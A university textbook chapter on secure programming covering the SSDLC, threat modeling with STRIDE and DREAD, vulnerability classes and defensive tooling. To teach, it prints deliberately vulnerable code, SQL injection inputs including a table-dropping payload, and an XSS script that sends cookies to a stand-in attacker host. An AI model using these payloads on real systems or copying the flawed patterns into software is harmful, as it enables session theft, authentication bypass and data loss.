---
title: "Chapter 9: Secure Programming"
chapter: 9
week: 9
course: SCIA-120
description: "A comprehensive examination of secure software development, covering the SSDLC, threat modeling, common vulnerability classes, secure coding practices, and analysis tools."
---

# Chapter 9: Secure Programming

## Introduction

Software is the attack surface. Every application that runs on a network, every operating system, every firmware image represents a body of code that was written by human beings who made decisions under the pressures of deadlines, incomplete requirements, and imperfect understanding. Those decisions — some deliberate, many inadvertent — produced vulnerabilities that adversaries exploit every day at scale.

The consequences of insecure software extend far beyond inconvenience. The 2017 Equifax breach, which exposed the sensitive personal data of 147 million Americans, was caused by a failure to patch a known Apache Struts vulnerability (CVE-2017-5638). The 2021 Log4Shell vulnerability (CVE-2021-44228) affected hundreds of millions of systems globally and required emergency patching campaigns across virtually every industry. In both cases, the fundamental issue was not a sophisticated novel attack — it was a known, preventable software vulnerability.

NIST estimates that fixing a software defect in the design phase costs 1× — fixing it in testing costs roughly 15×, and fixing it after deployment costs 30–100×. Security must be incorporated into software development from the start, not bolted on after the fact.

---

## 9.1 The Secure Software Development Lifecycle (SSDLC)

The traditional Software Development Lifecycle (SDLC) — requirements, design, implementation, testing, deployment, maintenance — becomes a *Secure* SDLC by integrating security activities at every phase rather than treating security as a final testing step.

**Requirements Phase**: Security requirements must be explicitly gathered alongside functional requirements. What data does the application handle? What are the regulatory requirements (HIPAA, PCI-DSS, GDPR)? What authentication and authorization are needed? Failure to articulate security requirements at this phase leads to architectural decisions that are difficult or impossible to secure later.

**Design Phase**: This is where threat modeling occurs — a structured analysis of what could go wrong with a system before a line of code is written. Security architecture decisions made here (choice of authentication mechanism, data storage design, network architecture, cryptographic protocols) are foundational. Fixing design flaws is exponentially cheaper than fixing implementation bugs.

**Implementation Phase**: Developers apply secure coding guidelines, use security-vetted libraries, and follow input validation and output encoding practices. Automated static analysis tools (SAST) can be integrated into the IDE and CI/CD pipeline to catch common vulnerabilities as code is written.

**Testing Phase**: Security testing goes beyond functional testing. This includes security-specific test cases, dynamic application security testing (DAST), penetration testing, and fuzz testing. Vulnerability scanning tools are run against the application and its dependencies.

**Deployment Phase**: The production environment is hardened (principle of least privilege for service accounts, minimal exposed services, secrets management, secure configuration). Deployment checklists include security sign-offs.

**Maintenance Phase**: Continuous vulnerability monitoring, patch management for application dependencies, security incident response integration. Many vulnerabilities are discovered not in internal code but in third-party libraries — ongoing dependency monitoring is essential.

---

## 9.2 Threat Modeling

**Threat modeling** is a structured approach to identifying security threats, their likelihood and impact, and appropriate countermeasures during the design phase. It answers the question: "What can go wrong with this system?"

### STRIDE

**STRIDE** is the most widely used threat categorization framework for software systems, developed by Microsoft. The acronym identifies six categories of threats:

| Threat | Violated Property | Example |
|--------|-------------------|---------|
| **S**poofing | Authentication | Attacker pretends to be another user or system |
| **T**ampering | Integrity | Attacker modifies data in transit or at rest |
| **R**epudiation | Non-repudiation | User denies performing an action |
| **I**nformation Disclosure | Confidentiality | Sensitive data exposed to unauthorized parties |
| **D**enial of Service | Availability | Service made unavailable to legitimate users |
| **E**levation of Privilege | Authorization | Attacker gains permissions they should not have |

The threat modeling process typically involves: (1) creating a data flow diagram (DFD) of the system, (2) identifying trust boundaries between components, (3) applying STRIDE to each element (processes, data stores, data flows, external entities), (4) rating each threat, and (5) identifying mitigations.

### DREAD

The **DREAD model** provides a risk rating framework for prioritizing identified threats:

- **D**amage: How severe is the damage if exploited? (1-10)
- **R**eproducibility: How reliably can the attack be reproduced? (1-10)
- **E**xploitability: How much skill/effort is required to exploit? (1-10)
- **A**ffected users: What percentage of users would be affected? (1-10)
- **D**iscoverability: How easy is it to discover the vulnerability? (1-10)

The total DREAD score (sum or average) allows threats to be prioritized. While the DREAD model has been criticized for subjectivity, it provides a useful structured conversation about risk among development teams.

---

## 9.3 Common Software Vulnerabilities

### Buffer Overflow

A **buffer overflow** occurs when a program writes more data to a buffer (a contiguous block of memory) than it was allocated to hold, overwriting adjacent memory regions. The consequences depend on what resides in adjacent memory: in a **stack buffer overflow**, the attacker typically overwrites the return address on the call stack with the address of attacker-supplied code (shellcode) or a gadget in the program's existing code (return-oriented programming, ROP). When the vulnerable function returns, execution jumps to the attacker's payload.

**Heap buffer overflows** target memory allocated by `malloc`/`new`. They are more complex to exploit but can corrupt heap metadata structures, function pointers, or vtable entries to achieve code execution.

Classic example (in C):

```c
void vulnerable_function(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // No bounds check — if input > 64 bytes, overflow!
}
```

If `input` contains more than 64 bytes, `strcpy` will write past the end of `buffer`, potentially overwriting the saved return address.

Mitigations include: using bounds-checked functions (`strncpy`, `snprintf`), enabling compiler mitigations (stack canaries via `-fstack-protector`, ASLR, DEP/NX bit), and using memory-safe languages (Rust, Go) that prevent buffer overflows at the language level.

### Integer Overflow

An **integer overflow** occurs when an arithmetic operation produces a result outside the range that the integer type can represent. For example, adding 1 to a `uint8_t` with value 255 yields 0 (wraps around). Integer overflows become security vulnerabilities when the result is used to allocate memory or control program flow:

```c
size_t len = user_supplied_length + 4;  // Could overflow to small value
char *buf = malloc(len);                 // Allocates too little memory
memcpy(buf, data, user_supplied_length); // Heap overflow!
```

If `user_supplied_length` is close to `SIZE_MAX`, adding 4 wraps around to a very small number, and `malloc` allocates a tiny buffer that the subsequent `memcpy` then overflows.

### Format String Vulnerabilities

**Format string vulnerabilities** arise when user-supplied data is passed directly as the format string argument to functions like `printf`:

```c
printf(user_input);          // DANGEROUS
printf("%s", user_input);    // SAFE
```

An attacker providing format specifiers like `%x%x%x%x` as `user_input` can read values off the stack. `%n` writes the number of bytes printed so far to a memory address, potentially enabling arbitrary memory writes. Format string bugs can lead to information disclosure and remote code execution.

### SQL Injection (with Code Examples)

**SQL injection (SQLi)** remains one of the most prevalent and impactful web vulnerabilities. It occurs when user-supplied data is incorporated into a SQL query without proper sanitization.

**Vulnerable code (Python):**
```python
username = request.form['username']
password = request.form['password']
query = "SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'"
result = db.execute(query)
if result:
    login_success()
```

**Attack**: An attacker enters `admin' --` as the username (and anything as the password). The query becomes:
```sql
SELECT * FROM users WHERE username='admin' --' AND password='anything'
```
The `--` comments out the rest of the query, bypassing the password check entirely.

More destructive attacks can use `UNION SELECT` to extract data from other tables, `'; DROP TABLE users; --` to destroy data, or blind SQLi techniques to exfiltrate data character by character when results aren't displayed.

**Safe code (parameterized query/prepared statement):**
```python
query = "SELECT * FROM users WHERE username=? AND password=?"
result = db.execute(query, (username, password))
```

With parameterized queries, user input is never interpreted as SQL code — it is passed as data values that the database driver safely handles.

### Cross-Site Scripting (Revisited from a Developer Perspective)

As covered in Chapter 8 from the attacker's perspective, **XSS** is fundamentally a failure of output encoding. When user-supplied data is included in HTML output without encoding, the browser may interpret it as HTML/JavaScript:

**Vulnerable (PHP):**
```php
echo "<p>Welcome, " . $_GET['name'] . "</p>";
```

If `name` is `<script>document.location='https://evil.com?c='+document.cookie</script>`, the browser will execute this script and send the victim's cookies to the attacker.

**Safe:**
```php
echo "<p>Welcome, " . htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8') . "</p>";
```

`htmlspecialchars` encodes `<`, `>`, `"`, and `'` as HTML entities, preventing script injection.

### Race Conditions

A **race condition** (or TOCTOU — Time Of Check to Time Of Use) vulnerability occurs when a program's behavior depends on the relative timing of events in a concurrent environment, and security-relevant state can change between a check and its use.

Example: A program checks if a file is writable (check), then opens and writes to it (use). An attacker using a symlink race can replace the target file with a symlink to a sensitive file (e.g., `/etc/passwd`) between the check and the use, causing the program to overwrite the sensitive file.

In web applications, race conditions can arise in multi-threaded environments where shared state (e.g., session data, balance checks) is not properly synchronized.

### Insecure Deserialization

Many languages provide mechanisms to serialize (convert to bytes) and deserialize (reconstruct from bytes) complex objects for storage or transmission. **Insecure deserialization** occurs when untrusted data is deserialized without validation. Depending on the language and libraries involved, this can lead to remote code execution, object injection, or data tampering.

Java's native serialization mechanism is particularly notorious — the `readObject` method can trigger arbitrary code execution if an attacker can supply crafted serialized data. Libraries like Apache Commons Collections had gadget chains that, combined with Java deserialization vulnerabilities, led to numerous critical remote code execution vulnerabilities.

### Use-After-Free

A **use-after-free** vulnerability occurs when a program continues to use a memory pointer after the memory it points to has been freed (deallocated). If an attacker can control what data is placed in the reallocated memory region, they may be able to redirect program execution. Use-after-free vulnerabilities are among the most common critical memory safety vulnerabilities in C/C++ code and are a primary motivation for the adoption of memory-safe languages like Rust.

---

## 9.4 Secure Coding Practices

### Input Validation and Sanitization

**Never trust user input.** All data entering a program from external sources — web forms, API parameters, URL parameters, HTTP headers, file uploads, database data, environment variables — must be treated as potentially malicious until validated.

*Validation* checks that input conforms to the expected format, type, length, and range. Prefer **whitelist (allowlist) validation** over blacklist validation: define what is acceptable and reject everything else, rather than trying to enumerate all possible malicious inputs. Blacklists are almost always incomplete.

*Sanitization* transforms input to remove or neutralize dangerous content. It is generally less safe than validation and should be used as a secondary defense. Do not rely on sanitization as the primary control.

### Parameterized Queries

As demonstrated in the SQL injection section, **parameterized queries** (also called prepared statements) prevent SQL injection by separating code from data. Every modern database library supports them. There is no legitimate reason to use string concatenation to build SQL queries with user input. Similarly, use ORM frameworks that handle parameterization automatically, but be aware of their configuration — many ORMs support raw query modes that can reintroduce SQLi if misused.

### Output Encoding

**Output encoding** is the complement to input validation: before including any data in output (HTML, JavaScript, CSS, URL, XML, JSON), encode it appropriately for the output context. HTML encoding, JavaScript encoding, URL encoding, and CSS encoding all use different character escapes and must be applied contextually. A string that is safe in an HTML body context may be dangerous in an HTML attribute, JavaScript string, or URL.

### Error Handling and Logging

Security-sensitive applications must handle errors carefully:
- **Do not expose internal details** (stack traces, database error messages, file paths) to end users in production. These help attackers understand the system's internals.
- **Log sufficient information** for forensic investigation (who did what, when, and from where) but **do not log sensitive data** (passwords, credit card numbers, health information, session tokens).
- Use **structured logging** that can be analyzed by SIEM systems.
- Ensure log integrity — logs stored only on the compromised system are useless for forensic purposes. Forward logs to a remote, secured log aggregation system.

### Cryptographic API Usage

A recurring theme in software security: **never roll your own cryptography**. Cryptographic implementation is extraordinarily subtle — timing side channels, improper IV handling, padding oracle vulnerabilities, and subtle mathematical errors can completely undermine otherwise sound algorithm selection. Even expert cryptographers discover implementation flaws in their own code.

Use well-established, actively maintained cryptographic libraries: OpenSSL/BoringSSL/LibreSSL (C), Bouncy Castle (Java), Python's `cryptography` package (which wraps libsodium or OpenSSL), libsodium (modern, opinionated, hard to misuse). Use high-level APIs that make secure choices by default. If you find yourself choosing cipher modes, IV sizes, or padding schemes manually, you are probably doing it wrong.

### Dependency Management and Software Composition Analysis (SCA)

Modern applications depend on dozens or hundreds of third-party libraries. These dependencies have their own vulnerabilities. **Software Composition Analysis (SCA)** tools scan your application's dependencies (via package manifests like `package.json`, `requirements.txt`, `pom.xml`, `go.sum`) against vulnerability databases (NVD, OSV, GitHub Advisory Database) and alert when vulnerable versions are detected.

Tools include Snyk, OWASP Dependency-Check, GitHub's Dependabot, and Google's OSV-Scanner. Incorporate SCA into the CI/CD pipeline to catch new vulnerabilities as they are disclosed. Pin dependency versions and use a lockfile to ensure reproducible builds and prevent supply chain attacks.

> ⚠️ **Warning — Supply Chain Attacks**: The 2020 SolarWinds attack compromised the build system of SolarWinds' Orion software and injected malicious code into legitimate signed software updates, affecting 18,000 organizations. The npm ecosystem has seen numerous malicious package publications and typosquatting attacks (packages named similarly to popular packages to trick developers into installing malicious code). Verify the integrity of dependencies and be thoughtful about what third-party code your application trusts.

### Static Analysis (SAST)

**Static Application Security Testing (SAST)** tools analyze source code (or compiled bytecode) without executing the program, looking for patterns that indicate security vulnerabilities. They can detect common vulnerabilities like SQL injection, XSS, buffer overflows, use of deprecated functions, and hard-coded credentials.

SAST tools include Semgrep (multi-language, rule-based), Checkmarx, Veracode, SonarQube (open-source tier available), Bandit (Python), and Brakeman (Ruby on Rails). SAST should be integrated into the IDE (developer gets immediate feedback) and CI/CD pipeline (gates build/merge on security findings). SAST has limitations — it produces false positives and may miss vulnerabilities that require runtime context (flow-sensitive analysis) — but it is a high-value, low-friction control.

### Dynamic Analysis (DAST) and Fuzzing

**Dynamic Application Security Testing (DAST)** tests a running application by sending malicious or malformed inputs and observing the response. DAST tools (OWASP ZAP, Burp Suite Professional) automate web application scanning — crawling the application, submitting test payloads for XSS, SQLi, and other vulnerabilities, and analyzing responses. DAST complements SAST by catching vulnerabilities that only manifest at runtime.

**Fuzzing** (fuzz testing) involves feeding large volumes of semi-random, malformed, or unexpected inputs to a program and monitoring for crashes, assertion failures, or unexpected behavior. Fuzzing is extraordinarily effective at finding memory safety vulnerabilities (buffer overflows, use-after-free, integer overflows) in C/C++ code. **Coverage-guided fuzzing** (AFL, libFuzzer, OSS-Fuzz) uses code coverage feedback to guide input generation toward unexplored code paths, dramatically improving efficiency. Google's OSS-Fuzz project fuzzes hundreds of critical open-source libraries continuously and has found thousands of security-critical bugs.

### Code Review for Security

Automated tools find many common vulnerability patterns but cannot reason about application logic, authentication flows, authorization decisions, or business logic flaws. **Manual security code review** by experienced reviewers remains essential. Focus code review efforts on security-sensitive code: authentication, authorization, session management, cryptographic operations, input handling at trust boundaries, and financial logic.

Structured review processes (checklists, threat model-informed reviews, pair review of security-critical changes) improve the effectiveness and consistency of code review.

### Penetration Testing Basics

**Penetration testing** (pen testing) is authorized, simulated attack against a system to discover exploitable vulnerabilities. Unlike automated scanning, pen testing involves human expertise in chaining vulnerabilities, finding logic flaws, and simulating realistic attacker techniques. Penetration tests should be performed:
- Against web applications before major releases
- Against network infrastructure periodically
- After significant architectural changes
- As required by compliance frameworks (PCI-DSS mandates annual penetration testing)

Pen testing should be clearly scoped, authorized in writing, and conducted by qualified professionals. The results should drive remediation, and retest should verify that mitigations are effective.

---

## 9.5 OWASP Secure Coding Practices

The **OWASP Secure Coding Practices Quick Reference Guide** provides a technology-agnostic checklist of secure coding principles organized into categories including:

- **Input Validation**: Validate all input from untrusted sources; use allowlist validation.
- **Output Encoding**: Encode output for the target context before rendering.
- **Authentication and Password Management**: Strong password policies, secure credential storage (bcrypt/Argon2), MFA.
- **Session Management**: Secure session token generation, `HttpOnly`/`Secure` cookie flags, session expiration.
- **Access Control**: Enforce authorization on every protected resource server-side.
- **Cryptographic Practices**: Use strong, up-to-date algorithms; use established libraries.
- **Error Handling and Logging**: No sensitive data in logs; no internal details in user-facing errors.
- **Data Protection**: Encrypt sensitive data at rest and in transit; minimize sensitive data collection.
- **Communication Security**: Use TLS for all network communication; validate certificates.
- **System Configuration**: Principle of least privilege; disable unnecessary features; keep dependencies current.
- **Database Security**: Parameterized queries; least-privilege DB accounts; encrypt sensitive stored data.
- **File Management**: Validate file uploads; store uploaded files outside the web root.
- **Memory Management**: Avoid unsafe memory functions; prefer memory-safe languages where possible.
- **General Coding Practices**: Code review; keep dependencies updated; follow a secure SDLC.

---

## Key Terms

- **SSDLC (Secure Software Development Lifecycle)**: Integration of security activities throughout all phases of the software development lifecycle.
- **Threat Modeling**: A structured process for identifying and prioritizing security threats during system design.
- **STRIDE**: A threat classification framework (Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege).
- **DREAD**: A risk scoring framework (Damage, Reproducibility, Exploitability, Affected Users, Discoverability).
- **Buffer Overflow**: Writing beyond the end of an allocated memory buffer, overwriting adjacent memory.
- **Stack Canary**: A compiler mitigation placing a random value before the return address; checked on function return to detect overflow.
- **Integer Overflow**: Arithmetic result exceeding the representable range of the integer type, causing wraparound.
- **Format String Vulnerability**: Passing user input directly as a format string to printf-family functions.
- **SQL Injection (SQLi)**: Injecting SQL code via user input to manipulate database queries.
- **Parameterized Query**: A SQL query with placeholders for user data, preventing injection.
- **XSS (Cross-Site Scripting)**: Injecting malicious scripts into web pages via unsanitized user input.
- **Output Encoding**: Transforming data for safe inclusion in a specific output context (HTML, JS, URL, etc.).
- **Race Condition (TOCTOU)**: A vulnerability where state changes between a security check and its use.
- **Insecure Deserialization**: Processing untrusted serialized data without validation, potentially enabling remote code execution.
- **Use-After-Free**: Using a memory pointer after the pointed-to memory has been freed.
- **SAST (Static Application Security Testing)**: Analyzing source code without execution to find security vulnerabilities.
- **DAST (Dynamic Application Security Testing)**: Testing a running application with malicious/malformed inputs.
- **Fuzzing**: Automated testing with random/malformed inputs to discover crashes and vulnerabilities.
- **SCA (Software Composition Analysis)**: Scanning application dependencies for known vulnerabilities.
- **Input Validation**: Verifying that user input conforms to expected format, type, length, and range before processing.
- **Allowlist Validation**: Accepting only explicitly permitted input values/patterns, rejecting everything else.
- **Penetration Testing**: Authorized simulated attack to discover exploitable vulnerabilities.
- **OWASP**: Open Web Application Security Project — produces widely referenced security standards, guides, and tools.

---

## Review Questions

1. Explain the concept of the "cost to fix a bug" increasing with each phase of the SDLC. Why is threat modeling in the design phase so valuable from both a security and cost-effectiveness perspective?

2. Apply the STRIDE framework to a simple web login page. For each of the six STRIDE threat categories, describe a specific threat to this feature and a corresponding mitigation.

3. Explain how a stack buffer overflow attack works. Describe the memory layout of a stack frame and explain how an attacker overwrites the return address. What compiler and OS-level mitigations exist to make this harder to exploit?

4. A developer writes the following code: `query = "SELECT * FROM accounts WHERE id = " + user_id`. Demonstrate a SQL injection attack against this code, then rewrite it securely using a parameterized query.

5. Explain the difference between blacklist (blocklist) and whitelist (allowlist) input validation. Why is allowlist validation generally preferred for security purposes? Give an example where blacklist validation would fail.

6. A web application logs the following: `2024-01-15 14:23:01 INFO User login: user=alice password=Secr3t! result=success`. Identify the security issues with this log entry and describe secure logging best practices.

7. Why is it dangerous to implement your own cryptographic algorithms or to use cryptographic primitives directly rather than high-level cryptographic APIs? Give an example of a common implementation mistake and its consequence.

8. Explain what a supply chain attack is in the context of software development. Describe the SolarWinds attack and what types of controls (SCA, SBOM, build integrity) can help detect or prevent supply chain compromises.

9. Compare SAST and DAST as security testing methodologies. What types of vulnerabilities is each better at finding? Why are both needed in a comprehensive security testing program?

10. An organization develops a mobile banking application. Describe the key security activities that should occur in each phase of the SSDLC for this application, from requirements gathering through deployment and maintenance.

---

## Further Reading

1. Viega, J., & McGraw, G. (2001). *Building Secure Software: How to Avoid Security Problems the Right Way*. Addison-Wesley. — A landmark text on integrating security into the development process.

2. Howard, M., & LeBlanc, D. (2003). *Writing Secure Code* (2nd ed.). Microsoft Press. — Practical guidance on secure coding practices across common vulnerability classes.

3. OWASP. (2010). *OWASP Secure Coding Practices Quick Reference Guide*. Available at: https://owasp.org/www-project-secure-coding-practices-quick-reference-guide/ — A concise, technology-agnostic checklist.

4. Seacord, R.C. (2013). *Secure Coding in C and C++* (2nd ed.). Addison-Wesley. — Authoritative reference on C/C++ vulnerabilities and their prevention.

5. Shostack, A. (2014). *Threat Modeling: Designing for Security*. Wiley. — The definitive practical guide to threat modeling, covering STRIDE and its application.
